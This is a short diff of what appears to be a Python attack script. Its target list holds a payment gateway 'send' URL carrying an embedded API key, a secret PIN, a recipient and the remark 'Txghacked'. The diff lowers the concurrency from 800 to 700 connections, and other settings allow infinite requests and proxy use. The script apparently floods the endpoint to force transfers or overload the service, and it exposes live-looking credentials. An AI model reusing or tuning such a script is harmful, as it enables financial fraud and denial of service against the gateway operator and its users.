@@ -27,7 +27,7 @@ TARGET_APIS = [
     "https://txg-gateway.xyz/client/api/send.php?api_key=f692ed462bc0976b5332a11944103df7&secret_pin=123456&toUser=9359202967&amount=1&remark=Txghacked"
 ]
 
-CONCURRENT = 800                # Safe for Railway – ~500 concurrent connections
+CONCURRENT = 700                # Safe for Railway – ~500 concurrent connections
 TOTAL_REQUESTS = 0              # 0 = infinite
 USE_PROXIES = False
 PROXY_FILE = "proxies.txt"
